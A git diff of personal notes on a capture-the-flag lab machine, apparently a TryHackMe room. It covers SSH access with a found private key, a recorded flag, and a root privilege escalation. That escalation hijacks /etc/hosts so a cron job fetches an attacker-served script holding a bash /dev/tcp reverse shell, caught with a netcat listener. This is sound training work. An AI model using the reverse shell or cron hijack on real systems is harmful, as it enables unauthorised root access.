@@ -27,6 +27,7 @@
       location: /admin
       ```
     - refreshed the webpage and got into a new page that had a private key in in belonging to "james"
+    - possible user "Paradox"
 
 6. Access to james' session with ssh
    - `ssh -i priv-key james@<target-ip>` < passphrase was found
@@ -37,8 +38,18 @@
 
 7. Accessed james' session and found the first flag
    - thm{65c1aaf000506e56996822c6281e6bf7}
+  
+8. Ran linpeas on the target machine
+   - found a cron job running as root
+   - found /etc/hosts as rw to anyone
 
-
-
-awk -F ',' '{print$2}' stuff.csv | more
-awk -F ',' '{print$2}' stuff.csv | sort -u
+9. Privilege escalation attempt
+   - because the machine has a cronjob that runs a script from overpass.thm/downloads/src/buildscript.sh, I need to create the path in my local machine and open an http server and a nc listener so that the target machine can connect to my machine via the cronjob(after changing the overpass.thm's ip in /etc/hosts)
+   - changed overpass.thm's ip in /etc/hosts to my local machine ip
+   - opened a nc listener on port 9001 `nc -lnvp 9001`
+   - created the necessary paths(./downloads/src/buildscript.sh) so that the cron job fetches the script correctly
+   - opened an http server on my local machine so that the curl will refer to my local machine `python3 -m http.server 80`
+   - added this shell code to buildscript.sh in my local machine inside /download/src/buildscript.sh
+     ```sh
+     bash -i >& /dev/tcp/<local-machine-ip>/9001 0>&1
+     ```
